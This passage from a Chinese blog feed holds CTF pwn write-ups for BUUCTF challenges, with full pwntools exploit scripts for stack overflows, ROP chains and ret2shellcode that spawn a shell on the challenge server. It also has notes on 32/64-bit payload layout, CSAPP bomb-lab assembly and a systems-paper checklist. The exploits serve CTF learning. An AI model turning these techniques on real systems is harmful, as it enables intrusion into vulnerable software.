class="hljs-string">&quot;Input your operation:&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.Add a log.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.Display all logs.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3.Print all logs.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0.Exit\n:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v4);<br>  <span class="hljs-keyword">switch</span> ( v4 )<br>  &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">return</span> result;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      <span class="hljs-built_in">AddLog</span>(src);<br>      result = <span class="hljs-built_in">sub_804892B</span>(argc, argv, envp);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      <span class="hljs-built_in">Display</span>(src);<br>      result = <span class="hljs-built_in">sub_804892B</span>(argc, argv, envp);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      <span class="hljs-built_in">Print</span>();<br>      result = <span class="hljs-built_in">sub_804892B</span>(argc, argv, envp);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>      <span class="hljs-built_in">GetFlag</span>(src);<br>      result = <span class="hljs-built_in">sub_804892B</span>(argc, argv, envp);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      result = <span class="hljs-built_in">sub_804892B</span>(argc, argv, envp);<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到向s1输入100个长度的字符，但是分配给s1的大小只有48，存在栈溢出。<br>并且选项4可以调用GetFlag函数。</p><p><strong>AddLog函数：</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> __cdecl <span class="hljs-constructor">AddLog(<span class="hljs-params">int</span> <span class="hljs-params">a1</span>)</span><br>&#123;<br>  printf(<span class="hljs-string">&quot;Please input new log info:&quot;</span>);<br>  return <span class="hljs-constructor">__isoc99_scanf(<span class="hljs-string">&quot;%128s&quot;</span>, <span class="hljs-params">a1</span>)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Display函数：</strong></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">Display</span><span class="hljs-params">(<span class="hljs-type">char</span> *s)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(s);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Print函数：</strong></p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Print</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-title">system</span><span class="hljs-params">(<span class="hljs-string">&quot;echo Printing......&quot;</span>)</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>有system函数了，但是参数不是我们想要的。</p><p><strong>GetFlag函数</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">GetFlag</span><span class="hljs-params">(<span class="hljs-type">char</span> *src)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> dest[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+0h] [ebp-48h] BYREF</span><br>  <span class="hljs-type">char</span> v3[<span class="hljs-number">60</span>]; <span class="hljs-comment">// [esp+4h] [ebp-44h] BYREF</span><br><br>  *(_DWORD *)dest = <span class="hljs-number">48</span>;<br>  <span class="hljs-built_in">memset</span>(v3, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(v3));<br>  <span class="hljs-built_in">strcpy</span>(dest, src);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The flag is your log:%s\n&quot;</span>, dest);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出flag就是我们的log，而选项1是可以自己输入log的。</p><p>所以大致逻辑就是我们在输入密码之后，首先选1，添加一个log，再选4调用flag，最后结束程序。</p><p>payload构造思路：</p><p><em>利用选择1之后的那一次输入，a1就是外面的src，程序给的大小是48，这边读入的时候读入了128长度的字符串，可以造成溢出，将程序的返回地址覆盖成system（‘&#x2F;bin&#x2F;sh’），然后选4去调用读取我们构造好的栈，获取shell</em></p><p>我们用如下命令查找‘&#x2F;bin&#x2F;sh’，但是找不到，继续找，找到‘sh’也是一样的效果。</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">ROPgadget --<span class="hljs-built_in">binary</span> ciscn_2019_ne_5 --<span class="hljs-built_in">string</span> <span class="hljs-string">&#x27;sh&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/images/pwn3-3.png"></p><p>shell_addr&#x3D;0x80482ea</p><p>system函数的地址很容易找到为0x080484D0</p><p>有了这些可以构造payload了：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">payload</span>=<span class="hljs-variable">b</span><span class="hljs-string">&#x27;B&#x27;</span>*<span class="hljs-number">48</span>+<span class="hljs-variable">b</span><span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">4</span>+<span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-variable">sys_addr</span>)+<span class="hljs-variable">b</span><span class="hljs-string">&#x27;1111&#x27;</span>+<span class="hljs-title">p32</span>(<span class="hljs-variable">shell_addr</span>)</span><br><span class="hljs-variable">b</span><span class="hljs-string">&#x27;1111&#x27;</span>也可以写成<span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-number">0</span><span class="hljs-variable">x12121212</span>)</span><br></code></pre></td></tr></table></figure><p>之后选4去调用我们的这个构造好的栈即可获取shell。</p><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><br><span class="hljs-attribute">r</span>=remote(&quot;node4.buuoj.cn&quot;,25746)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./ciscn_2019_ne_5&#x27;)<br><span class="hljs-attribute">system_addr</span>=elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-attribute">shell_addr</span>=0x80482ea<br><br>r.recvuntil(b<span class="hljs-string">&#x27;Please input admin password:&#x27;</span>)<br>r.sendline(b<span class="hljs-string">&#x27;administrator&#x27;</span>)<br><br>r.recvuntil(b<span class="hljs-string">&#x27;0.Exit\n:&#x27;</span>)<br>r.sendline(b<span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-attribute">payload</span>=b&#x27;a&#x27;*(0x48+4)+p32(system_addr)+b&#x27;1111&#x27;+p32(shell_addr)<br><br>r.recvuntil(b<span class="hljs-string">&#x27;Please input new log info:&#x27;</span>)<br>r.sendline(payload)<br><br>r.recvuntil(b<span class="hljs-string">&#x27;0.Exit\n:&#x27;</span>)<br>r.sendline(b<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>32/64位payload构造注意事项</title>
    <link href="/2023/09/18/32-64%E4%BD%8Dpayload%E6%9E%84%E9%80%A0%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/"/>
    <url>/2023/09/18/32-64%E4%BD%8Dpayload%E6%9E%84%E9%80%A0%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</url>
    
    <content type="html"><![CDATA[<h2 id="堆栈平衡问题"><a href="#堆栈平衡问题" class="headerlink" title="堆栈平衡问题"></a>堆栈平衡问题</h2><p>32位中，没有堆栈平衡一说，而64位中有。payload中的堆栈平衡简单来说，就是要保证payload的字节数是16的倍数。而p64是将地址转为8字节的字符串，所以payload中得保证p64是偶数倍，就能满足堆栈平衡。因此对于写完payload后还是单数倍的p64时，就需要加单数个【当然加1个就行】p64(ret)，【ret代表ret指令的地址，可以直接在IDA里面任意找一个，也可以用ROPgadget来找】，因为ret的多少不会影响到函数的执行逻辑，所以用其来平衡。</p><h2 id="参数顺序"><a href="#参数顺序" class="headerlink" title="参数顺序"></a>参数顺序</h2><p><strong>32位中先写函数，再写参数</strong><br>参数可能是返回值，如调用system，需要多加个参数作返回值。最后一个函数都需要有返回值。<br>每个函数都有返回值，而我们对函数返回值不感兴趣【比如一些函数执行成功会返回1】只需要有个位置充当一下，而之前对于多个函数的解释也进一步得以优化，其应该是需要返回值的，只不过位置正好被其他的东西给占据了，如pop_这些用于给参数位置的rop链给一举两得给占据了，也就是说，即使是最后一个函数有参数，也不用在单独写一个p32(0)来填充返回值的位置，因为pop_已经将这件事给做了，例如payload &#x3D; cyclic(0x2c + 4) + p32(func1) + p32(func2) + p32(pop_ebx) + p32(0xACACACAC) + p32(flag) + p32(pop_ebx) + p32(0xBDBDBDBD)</p><p><strong>64位中先写参数，再写函数</strong></p><p>例如：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">payload</span> = <span class="hljs-function"><span class="hljs-title">cyclic</span>(<span class="hljs-number">0</span><span class="hljs-variable">x12</span> + <span class="hljs-number">4</span>) + <span class="hljs-title">p32</span>(<span class="hljs-variable">system</span>) + <span class="hljs-title">p32</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p32</span>(<span class="hljs-variable">sh</span>)</span><br></code></pre></td></tr></table></figure><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">payload</span> = <span class="hljs-function"><span class="hljs-title">cyclic</span>(<span class="hljs-number">0</span><span class="hljs-variable">xa</span> + <span class="hljs-number">8</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">pop_rdi_ret</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">sh</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">ret</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">system</span>)</span><br></code></pre></td></tr></table></figure><h2 id="参数存放位置"><a href="#参数存放位置" class="headerlink" title="参数存放位置"></a>参数存放位置</h2><p>在32位中，参数和返回值直接就存在栈中，但对于payload中有多个函数时，如果不是最后一个函数，则需要将其参数用寄存器来保存。</p><p>在64位中，函数参数一律得用寄存器来存储。64位和32位不同，参数不是直接放在栈上，而是优先放在寄存器rdi,rsi,rdx,rcx,r8,r9。这几个寄存器放不下时才会考虑栈。</p><p>例如：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">payload</span> = <span class="hljs-function"><span class="hljs-title">cyclic</span>(<span class="hljs-number">0</span><span class="hljs-variable">xa</span> + <span class="hljs-number">8</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">pop_rdi</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">buf2</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">gets</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">pop_rdi</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">buf2</span>)  + <span class="hljs-title">p64</span>(<span class="hljs-variable">system</span>)</span><br></code></pre></td></tr></table></figure><p>64位是用rdx、rsi、rdi三个寄存器传参，进行子函数调用时程序会先将子函数的参数存入rdx、rsi、rdi。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn——输出flag.txt</title>
    <link href="/2023/09/18/Pwn%E2%80%94%E2%80%94%E8%BE%93%E5%87%BAflag-txt/"/>
    <url>/2023/09/18/Pwn%E2%80%94%E2%80%94%E8%BE%93%E5%87%BAflag-txt/</url>
    
    <content type="html"><![CDATA[<h2 id="例题（BUUCTF-not-the-same-3dsctf-2016）"><a href="#例题（BUUCTF-not-the-same-3dsctf-2016）" class="headerlink" title="例题（BUUCTF not_the_same_3dsctf_2016）"></a>例题（BUUCTF not_the_same_3dsctf_2016）</h2><h3 id="题目信息："><a href="#题目信息：" class="headerlink" title="题目信息："></a>题目信息：</h3><p><img src="/images/check0918.png"></p><p>主要函数有两个，后门函数：</p><p><img src="/images/main0918.png"></p><p>main函数：</p><p><img src="/images/back0918.png"></p><p>明显的栈溢出。后门函数像是读了flag.txt的内容到fl4g变量中，这个题应该是有好几种做法，先整理两种我看的懂的，还有一种是利用mprotect方法，这个我没太懂，后续再整理。。。</p><p>这两种做法思路都是将fl4g变量中的内容打印出来。</p><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p><strong>首先溢出到get_secret函数，再利用write()将fl4g参数中的内容读出来</strong></p><p>payload如下：</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs leaf">payload=&#x27;a&#x27;*0x2d+p32(0x80489a0)+p32(elf.symbols[&#x27;write&#x27;])+p32(flag_addr)+p32(1)+p32(flag_addr)+p32(42)<br><br>#0x2d个垃圾数据填充  get_secret函数的地址   write函数的地址    fl4g变量的位置   最后三个是write函数的参数（最后一个参数修改为45也可以）<br><span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-variable">int</span> <span class="hljs-variable">filedes</span>, <span class="hljs-variable">const</span> <span class="hljs-variable">void</span> *<span class="hljs-variable">buf</span>, <span class="hljs-variable">size_t</span> <span class="hljs-variable">nbytes</span>)</span></span>;<br>#write 函数向 filedes 中写入 nbytes 字节数据，数据来源为 buf <br></code></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import*<br><br><span class="hljs-attribute">r</span>=remote(&#x27;node4.buuoj.cn&#x27;,26797)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./not&#x27;)<br><span class="hljs-attribute">flag_addr</span>=0x80eca2d<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*0x2d+p32(0x80489a0)+p32(elf.symbols[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(flag_addr)+p32(1)+p32(flag_addr)+p32(42)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p><strong>利用printf和exit输出fl4g</strong></p><p>首先找能打印出fl4g的函数，在这里找的是printf的地址</p><p><img src="/images/printf0918.png"></p><p>需要一个正常退出的函数，所以找找exit</p><p><img src="/images/exit_0918.png"></p><p>完整exp：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">from pwn import*<br>p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28483</span>)<br><br>get_secret=<span class="hljs-number">0</span>x080489a0<br>flag=<span class="hljs-number">0</span>x080eca2d   <span class="hljs-comment">#fl4g变量的地址</span><br>printf=<span class="hljs-number">0</span>x0804f0a0<br><span class="hljs-keyword">exit</span>=<span class="hljs-number">0</span>x0804e660<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x2d+p32(get_secret)+p32(printf)+p32(<span class="hljs-keyword">exit</span>)+p32(flag)  <span class="hljs-comment">#这里为什么fl4g变量的地址要放在最后一个？（读下一篇32/64参数顺序区别）</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn——ret2shellcode(BUUCTF ciscn_2019_n_5)</title>
    <link href="/2023/09/14/Pwn%E2%80%94%E2%80%94ret2shellcode-BUUCTF-ciscn-2019-n-5-1/"/>
    <url>/2023/09/14/Pwn%E2%80%94%E2%80%94ret2shellcode-BUUCTF-ciscn-2019-n-5-1/</url>
    
    <content type="html"><![CDATA[<h2 id="ret2shellcode练习"><a href="#ret2shellcode练习" class="headerlink" title="ret2shellcode练习"></a>ret2shellcode练习</h2><p><strong>例题：BUUCTF ciscn_2019_n_5</strong></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><img src="/images/check.png"></p><p>查看题目信息，64位，没有开启任何保护。</p><p>拖到ida里，只有一个关键函数main函数：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> text[<span class="hljs-number">30</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;tell me your name&quot;</span>);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, name, <span class="hljs-number">0x64</span>uLL);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;wow~ nice name!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What do you want to say to me?&quot;</span>);<br>  <span class="hljs-built_in">gets</span>(text);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>并且没有发现system和&#x2F;bin&#x2F;sh。</p><p>nc查看一下程序，有两个输入点，第一次让我们输入名字，限制输入长度为0x64，看一下name参数，发现name在全局变量bss段上</p><p><img src="/images/nc.png"></p><p><img src="/images/name.png"></p><p>第二次输入利用gets，没有限制长度，可以对v4造成溢出。</p><p><img src="/images/text.png"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>1.利用第一个输入点，往name参数里写入shellcode</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">context</span><span class="hljs-params">(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)</span></span>                   #用来导入pwntools模块<br>shellcode=<span class="hljs-built_in">asm</span>(shellcraft<span class="hljs-selector-class">.sh</span>())                     #利用pwntools模块自动生成shellcode<br>r<span class="hljs-selector-class">.sendlineafter</span>(<span class="hljs-string">&#x27;tell me your name&#x27;</span>,shellcode)     #往name中写入shellcode<br></code></pre></td></tr></table></figure><p><strong>2.v4溢出到name参数地址，去执行shellcode拿到shell</strong></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">payload=&#x27;a&#x27;*<span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0x601080</span>)                    <span class="hljs-comment">#让v4溢出到name参数地址</span><br>r.sendlineafter(&#x27;What do you want <span class="hljs-keyword">to</span> <span class="hljs-built_in">say</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">me</span>?&#x27;,payload)<br></code></pre></td></tr></table></figure><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><br><span class="hljs-attribute">r</span>=remote(&#x27;node4.buuoj.cn&#x27;,27058)<br><br>context(<span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=&#x27;linux&#x27;)<br><span class="hljs-attribute">shellcode</span>=asm(shellcraft.sh())<br>r.sendlineafter(<span class="hljs-string">&#x27;tell me your name&#x27;</span>,shellcode)<br><br><span class="hljs-attribute">payload</span>=b&#x27;a&#x27;*0x28+p64(0x601080)<br>r.sendlineafter(<span class="hljs-string">&#x27;What do you want to say to me?&#x27;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP——二进制炸弹——汇编指令积累</title>
    <link href="/2023/09/14/CSAPP%E2%80%94%E2%80%94%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%82%B8%E5%BC%B9%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E7%A7%AF%E7%B4%AF/"/>
    <url>/2023/09/14/CSAPP%E2%80%94%E2%80%94%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%82%B8%E5%BC%B9%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E7%A7%AF%E7%B4%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3:"></a>phase_3:</h2><pre><code class="hljs">JG   ;有符号大于则跳转(前&gt;后)JA   ;无符号大于则跳转( “无符号”一词表示只能包含正数的变量。)je   ;相等跳转 (左操作数=右操作数)jmpq *0x402390(,%rax,8)   ;用于直接跳转到存储在的绝对地址 8 * %rax + 0x402390cmpl source dest   ;source&lt;dest则CF=1,否则CF=00x8 (%rsp)   ;表示“获取栈上距离栈指针 %rsp 8 个字节的位置，然后获取该地址处的值。lea eax，[addr]   ;将表达式addr的值放入eax寄存器</code></pre><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cmpl</span>   $<span class="hljs-number">0</span>x7,<span class="hljs-number">0</span>x8(%rsp)# 第一个数必须小于<span class="hljs-number">7</span>，否则爆炸<br><span class="hljs-attribute">ja</span>     <span class="hljs-number">400</span>fad# 引爆炸弹<br></code></pre></td></tr></table></figure><p>以上两句汇编等同于 if (*rsp+8) &gt; 7, 跳转到0x400fad， 因此第一个数必须不大于7。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">jmpq</span> *<span class="hljs-number">0</span>x402470(,%rax,<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>是一个间接跳转指令, 可以看出这段代码是典型的switch语句，跳转表就存在于0x402470。%rax取值为[0, 7]，代表switch语句中8条不同的case。</p><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4:"></a>phase_4:</h2><pre><code class="hljs">    Test   ;普遍的用法是用来测试一方寄存器是否为空：</code></pre><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">test </span>ecx, ecx<br>jz somewhere<br></code></pre></td></tr></table></figure><p>如果ecx为零，设置ZF零标志为1，jz跳转。</p><pre><code class="hljs">    JBE命令时，如果此时的CF标志位或者ZF标志位为1，跳转，其他不跳转    SHR   ;（右移）指令使目的操作数逻辑右移一位，最高位用 0 填充。    SAR   ;（算术右移）指令将目的操作数进行算术右移：    lea (%rax,%rsi,1),%ecx   ;作用是ecx=rax+rsi*1    cmp %edi,%ecx     jle 400ff2      ;若ecx≤edi，则跳转到400ff2    cmp %edi,%ecx    jge 401007     ；若ecx≥edi，则跳转到401007</code></pre><h2 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase_5"></a>Phase_5</h2><pre><code class="hljs">    xor eax,eax</code></pre><p>eax异或eax，相同为0，并把结果存放到eax，简单说该语句就是想eax寄存器清零。<br></p><p><strong>windows x64寄存器命名规则</strong></p><pre><code class="hljs">    前缀R    表示64位寄存器。例如RAX。    前缀E    表示32位寄存器。例如EAX    后缀L    表示寄存器的低8位    后缀H    表示寄存器的9~16位</code></pre><p><img src="https://github.com/xhsy0314/Task/assets/84487619/86dfc5a1-ba28-4d9a-902e-75206d2d355c"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>系统论文——How (and How Not) to Write a Good Systems Paper</title>
    <link href="/2023/09/14/%E7%B3%BB%E7%BB%9F%E8%AE%BA%E6%96%87%E2%80%94%E2%80%94How-and-How-Not-to-Write-a-Good-Systems-Paper/"/>
    <url>/2023/09/14/%E7%B3%BB%E7%BB%9F%E8%AE%BA%E6%96%87%E2%80%94%E2%80%94How-and-How-Not-to-Write-a-Good-Systems-Paper/</url>
    
    <content type="html"><![CDATA[<h1 id="How-and-How-Not-to-Write-a-Good-Systems-Paper"><a href="#How-and-How-Not-to-Write-a-Good-Systems-Paper" class="headerlink" title="How (and How Not) to Write a Good Systems Paper"></a>How (and How Not) to Write a Good Systems Paper</h1><p><strong>论文类别</strong>:</p><ul><li>它通过对整个系统的全球调查或通过对系统中具体主题的选择性审查，呈现了一个真实的系统。</li><li>它提供了一个未实现的系统，但使用了您认为技术社区应该知道的想法或技术。</li><li>它涉及理论领域的一个主题，例如性能建模或安全验证。</li></ul><p><strong>系统论文写作30问</strong>:</p><ul><li>论文中的想法是新的吗？</li><li>你怎么知道该想法是不是新的？</li><li>能简明扼要地陈述这个新想法吗？</li><li>问题究竟在解决什么？</li><li>这些想法是否足以证明一篇论文的合理性？</li><li>所描述的工作是否与现有工作有显著不同？</li><li>是否引用了所有相关工作，并且实际阅读了引用材料？</li><li>与以前工作的比较是否清晰明确？</li><li>工作是否包括重要的扩展、验证或否定早期但未经证实的想法？</li><li>引用的最早的和最新的论文是什么？</li></ul><hr><ul><li>这篇论文是否描述了一些实际上已经存在的东西？</li><li>如果系统已经实施，如何使用它，以及这种用法是否表明了这些想法的实际重要性？</li><li>如果这个系统还没有实施，那么这些想法现在是否值得发表？</li></ul><hr><ul><li>你从工作中学到了什么？</li><li>读者应该从论文中学到什么？</li><li>这些经验教训的普遍适用性如何？</li></ul><hr><ul><li>在不同点考虑了哪些替代方案，为什么会做出这样的选择？</li><li>这些选择被证明是正确的吗？</li></ul><hr><ul><li>这项工作所基于的假设是什么？</li><li>这些假设现实吗？</li><li>工作对这些假设的扰动有多敏感？</li><li>如果提出一个正式的模型，它会提供新的信息和见解吗？</li></ul><hr><ul><li>介绍材料中是否包含与您主要开发所不相关的描述？</li><li>是否从以前出版的作品中包含了足够的材料，使你的读者能够遵循你的论点？</li></ul><hr><ul><li>这些想法是否以清晰和合乎逻辑的方式组织和呈现？</li><li>术语在使用之前